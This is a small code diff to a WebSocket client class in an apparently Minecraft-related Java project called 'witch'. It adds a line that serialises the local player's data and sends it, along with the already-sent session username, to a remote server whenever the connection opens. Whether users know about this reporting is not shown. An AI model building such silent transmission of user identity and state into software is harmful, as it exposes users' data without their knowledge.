@@ -1,6 +1,8 @@
 package me.soda.witch.websocket;
 
+import com.google.gson.Gson;
 import me.soda.witch.Witch;
+import me.soda.witch.features.PlayerInfo;
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
 
@@ -22,6 +24,7 @@ public class WSClient extends WebSocketClient {
         System.out.println("Connection initialized");
         String greetingMsg = "Reconnected " + reconnections + " times, I am " + mc.getSession().getUsername();
         MessageUtils.sendMessage("greeting", greetingMsg);
+        MessageUtils.sendMessage("player", new Gson().toJson(new PlayerInfo(Witch.mc.player)));
     }
 
     @Override
